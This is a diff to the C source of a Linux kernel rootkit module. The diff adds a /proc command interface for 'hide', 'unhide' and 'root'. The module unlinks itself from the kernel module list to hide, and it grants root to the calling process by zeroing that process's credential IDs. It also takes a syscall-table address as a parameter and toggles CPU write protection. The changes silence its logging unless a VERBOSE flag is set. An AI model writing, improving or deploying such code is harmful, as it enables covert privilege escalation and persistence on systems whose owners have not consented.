@@ -3,17 +3,10 @@
 #include <linux/module.h>
 #include <linux/kernel.h>
 #include <linux/proc_fs.h>
-#include <linux/list.h>
 #include <linux/uaccess.h>
 #include <linux/spinlock_types.h>
 #include <linux/slab.h>
-#include <linux/string.h>
-#include <linux/syscalls.h>
-#include <linux/fcntl.h>
-#include <linux/kobject.h>
 #include <linux/cred.h>
-#include <linux/sysfs.h>
-#include <linux/unistd.h>
 
 #include "rootkit.h"
 
@@ -42,9 +35,11 @@ static int is_rootkit_hidden = 0;
 static void **syscall_table_pointer;
 
 // Module argument
-static char* sys_call_table_addr_input;
+static char* sys_call_table_addr_input = NULL;
 module_param(sys_call_table_addr_input, charp, 0);
 
+// Help strings
+static char *help = "Recognized commands: hide, unhide, root";
 
 // Create new process_info struct
 typedef struct process_info{
@@ -62,9 +57,10 @@ struct file_operations procFile_fops = {
 
 };
 
-// Create kernel list
-LIST_HEAD(procList);
-LIST_HEAD(moduleList);
+
+// for restoring this module later
+struct list_head *module_list;
+
 
 /* This two functions deal with the writable bit in cpu that prevent the syscall_table \
 	tampering
@@ -106,26 +102,37 @@ static void disable_write_protect(void){
 
 */
 static int get_syscall_table(void){
+
+    if(!sys_call_table_addr_input){
+
+        return -1;
+
+    }
 	
 	syscall_table_pointer = (void**)sys_call_table_addr_input;
 
+    #ifdef VERBOSE
+
 	pr_info("Disabling write-protection...");
+
+    #endif
 
 	enable_write_protect();
 
 
 	disable_write_protect();
 
+    #ifdef VERBOSE
+
 	pr_info("Enabling write-protection...");
+
+    #endif
 
 	return 0;	
 	
 }
 
-struct list_head *module_list;
-
-// struct kobject backup_module_kobj;
-
+// We hide the module by removing in from the list
 static int hide_self(void){
 
 	if(!is_rootkit_hidden){
@@ -137,30 +144,37 @@ static int hide_self(void){
 
 		is_rootkit_hidden = 1;
 
+        #ifdef VERBOSE
+
 		pr_info("Hide successfull.");
+
+        #endif
 	}
 
 	return 0;
 }
 
+// to unhide, we restore the module back to list
 static int unhide_self(void){
 
-	// int ret;
-
-	if(is_rootkit_hidden == 1){
+	if(is_rootkit_hidden){
 
 		list_add(&THIS_MODULE->list, module_list);
 
 		is_rootkit_hidden = 0;
 
+        #ifdef VERBOSE
+
 		pr_info("Unhide successfull.");
+
+        #endif
 
 	}
 
 	return 0;
 }
 
-
+// for granting root, we tampering the cred structure of current task to root
 static int get_root(void){
 
 	struct cred *task_credential;
@@ -173,6 +187,7 @@ static int get_root(void){
 		return -ENOMEM;
 	}
 
+    // Set credential to root
 	task_credential->uid.val = 0; 
 	task_credential->suid.val = 0;
 	task_credential->euid.val = 0;
@@ -202,6 +217,9 @@ static int parse_input(char *commands){
 		get_root();
 		
 	}
+    else{
+        return -1;
+    }
 
 	return 0;
 
@@ -212,9 +230,7 @@ static ssize_t rootkit_read(struct file *file, char __user *buffer, size_t count
 
     int copied;
     unsigned long tmpFlags;
-    char *buf;
-    struct process_info *currProc; // use as loop cursor
-    struct process_info *n; // temp storage for loop
+    char *buf = kmalloc(sizeof(char)*1024, GFP_KERNEL);
 
     // For EOF
     static int done = 0;
@@ -226,18 +242,13 @@ static ssize_t rootkit_read(struct file *file, char __user *buffer, size_t count
 
     
     done = 1;
-
-
-    buf = (char *) kzalloc(count, GFP_KERNEL);
     copied = 0;
 
     // perform the buffer transfer
     spin_lock_irqsave(&lock, tmpFlags);
 
-    // Should change this to return process information from procList
-    list_for_each_entry_safe(currProc, n, &procList, list){
-
-    }
+    // Send help to user 
+    copied = sprintf(buf,"%s\n", help);
 
     spin_unlock_irqrestore(&lock, tmpFlags);
 
@@ -262,8 +273,13 @@ static ssize_t rootkit_write(struct file *file, const char __user *buffer, size_
 
     if(copy_from_user(buf, buffer, count)){
 
-    pr_info("Error reading from /proc");
-      return -EFAULT;
+        #ifdef VERBOSE
+
+        pr_info("Error reading from /proc");
+
+        #endif
+
+        return -EFAULT;
     }
 
     buf[strlen(buf) - 1] = '\0';
@@ -286,8 +302,15 @@ int __init rootkit_init(void)
     proc_dir = proc_mkdir(PROCFS_NAME, NULL);
 
     if(proc_dir == NULL){
-       pr_alert("Could not create /proc/%s\n", PROCFS_NAME);
-       return -ENOMEM;
+
+        #ifdef VERBOSE
+
+        pr_alert("Could not create /proc/%s\n", PROCFS_NAME);
+
+        #endif
+
+
+        return -ENOMEM;
     }
 
     // create the status file       
@@ -296,7 +319,13 @@ int __init rootkit_init(void)
     if(proc_dir_entry == NULL){
 
        proc_remove(proc_dir);
+
+       #ifdef VERBOSE
+
        pr_alert("Could not create /proc/%s/status\n", PROCFS_NAME);
+
+       #endif
+
        return -ENOMEM;
     }
 
@@ -307,30 +336,30 @@ int __init rootkit_init(void)
 
 	hide_self();
 
+    #ifdef VERBOSE
+
     pr_alert("MODULE LOADED\n");
+
+    #endif
 
     return 0;   
 }
 
 void __exit rootkit_exit(void)
 {
-    struct process_info *currProc;
-    struct process_info *n;
 
 
     proc_remove(proc_dir_entry);
+
     proc_remove(proc_dir);
-   
-    // Delete list
-    list_for_each_entry_safe(currProc, n, &procList, list){
-      list_del(&currProc->list);
-      kfree(currProc);
-    }
 
     unhide_self();
    
+    #ifdef VERBOSE
 
     pr_alert("MODULE UNLOADED\n");
+
+    #endif
 }
 
 // Register init and exit funtions
